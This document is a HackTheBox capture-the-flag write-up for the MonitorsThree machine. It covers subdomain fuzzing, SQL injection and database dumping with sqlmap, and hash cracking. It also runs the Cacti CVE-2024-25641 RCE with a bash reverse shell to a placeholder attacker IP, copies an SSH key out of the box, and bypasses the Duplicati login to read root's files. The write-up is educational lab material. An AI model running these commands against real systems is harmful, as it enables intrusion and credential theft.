🌐 [English](README.md) | [Français](README.fr.md) | [日本語](README.ja.md)

# MonitorsThree — HackTheBox Writeup

<div style="display: flex; align-items: center; gap: 20px;">
<img src="https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/a9c8709743c935ae079e3b04d9304c99.png" width="120"/>
<div>

**Difficulty**: Medium  
**OS**: Linux  
**Type**: Web / SQLi / CVE  

</div>
</div>

---

## Attack Chain Summary

```
Nmap → dirsearch → ffuf → cacti.monitorsthree.htb
→ SQLi (forgot password) → sqlmap → hash crack (hashcat)
→ CVE-2024-25641 RCE → reverse shell (www-data)
→ su marcus → SSH (id_rsa) → user flag
→ linpeas → Duplicati (localhost) → SSH tunnel
→ Duplicati auth bypass → backup root.txt → root flag
```

---

## Enumeration

### Nmap Scan

```bash
nmap -sC -sV <TARGET_IP> -oN scan.txt -Pn
```

![nmap scan](assets/scan.png)

Open ports: SSH (22), HTTP (80), and a couple of secondary services (5555, 8084).  
Target: `monitorsthree.htb` — Linux.

> SSH is noted for later. Ports 5555 and 8084 don't offer obvious exploitation paths.

### DNS Setup

Port 80 requires adding the hostname to `/etc/hosts`:

```bash
sudo nano /etc/hosts
```

![dns add](assets/DNS.png)

### Directory Enumeration

```bash
dirsearch -u http://monitorsthree.htb/
```

![dirsearch](assets/dirsearch.png)

We find JS/fonts/images and an `/admin` page — not accessible yet.

### Subdomain Enumeration

```bash
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt \
  -u http://monitorsthree.htb/ -H "Host: FUZZ.monitorsthree.htb" -fs 13560
# -fs 13560 filters false positives
```

![ffuf](assets/ffuf.png)

We find `cacti.monitorsthree.htb` — a system monitoring tool. After adding it to `/etc/hosts`, we land on a login panel that reveals the running version.

![cacti](assets/cacti.png)

---

## Foothold — SQLi + CVE-2024-25641 RCE

### SQL Injection on Forgot Password

The "Forgot Password" page is injectable.

![forgot](assets/forgot.png)

We capture the request with Burp Suite:

![request](assets/request.png)

### Dumping the Database with SQLMap

```bash
sqlmap -r request.txt --dbs --batch
```

![sqlmap](assets/sqlmap.png)

```bash
sqlmap -r request.txt --dbms=mysql --technique=B \
  -D monitorsthree_db --dump-all --random-agent --level 5
```

We recover several hashed passwords and an `admin` credential.

### Cracking the Hash

```bash
hashcat -m 0 -a 0 "<MD5_HASH>" /usr/share/wordlists/rockyou.txt --show
```

One of the four hashes cracks successfully → password recovered.

### Logging in to Cacti

Credentials: `admin` / `<cracked_password>`

![panel](assets/panel.png)

### RCE via CVE-2024-25641

This version of Cacti is vulnerable to an authenticated RCE. We use the PoC by [@StopThatTalace](https://github.com/StopThatTalace/CVE-2024-25641-CACTI-RCE-1.2.26).

**Listener:**

```bash
nc -lnvp 4242
```

**Exploit:**

```bash
python3 CVE-2024-25641.py http://cacti.monitorsthree.htb/cacti/ \
  --user admin --pass <ADMIN_PASSWORD> \
  -x "bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4242 0>&1'"
```

![reverse](assets/reverse.png)

We get a shell as `www-data`.

---

## User Flag

### Pivoting to marcus

```bash
ls /home
```

![home](assets/home.png)

SSH to marcus requires a key:

![bone](assets/bone.png)

We switch to marcus using the password recovered from the database dump, then serve his SSH key:

```bash
# On the target, as marcus:
cd /home/marcus/.ssh
python3 -m http.server
```

```bash
# On Kali:
wget http://<TARGET_IP>:8000/id_rsa
```

![wget](assets/wget.png)

```bash
chmod 600 id_rsa
ssh -i id_rsa marcus@<TARGET_IP>
```

![ssh](assets/ssh.png)

User flag obtained.

---

## Privilege Escalation — Duplicati Auth Bypass

### Internal Port Discovery

```bash
# linpeas
```

![linpeas](assets/linpeas.png)

We spot a web app on an internal port. We set up SSH tunneling to access it:

![tunel](assets/tunel.png)

A `Duplicati` instance is running locally:

![duplicati](assets/duplicati.png)

### Bypassing Duplicati Authentication

We follow [this article](https://medium.com/@STarXT/duplicati-bypassing-login-authentication-with-server-passphrase-024d6991e9ee) to bypass the login:

1. **Extract the database password** from Duplicati's local config (accessible as marcus).
2. **Intercept the nonce** via Burp Suite during the login flow.
3. **Generate a valid password** from the nonce + database passphrase.

![password](assets/password.png)
![nonce](assets/nonce.png)
![pass](assets/pass.png)

We replace the password field in the intercepted request with our generated value → authenticated.

![app](assets/app.png)

Duplicati runs as root, giving us read access to any file on the system.

### Reading root.txt via Backup/Restore

**Destination:** `/source/home/marcus`

![source](assets/marcus_source.png)

**Source:** `/root/root.txt`

![source](assets/source.png)

**Run the backup:**

![backup](assets/backup.png)

**Restore:**

![restore](assets/restore.png)

**Result:**

![root](assets/root.png)

Root flag obtained.

---

## Tools Used

- `nmap` — port scanning
- `dirsearch` — directory enumeration
- `ffuf` — subdomain fuzzing
- `sqlmap` — SQL injection exploitation
- `hashcat` — hash cracking
- `burp suite` — request interception
- `CVE-2024-25641` PoC — Cacti RCE
- `netcat` — reverse shell listener
- `ssh` / `wget` — key exfiltration
- `linpeas` — privilege escalation enumeration
- `duplicati` — backup/restore as root

---
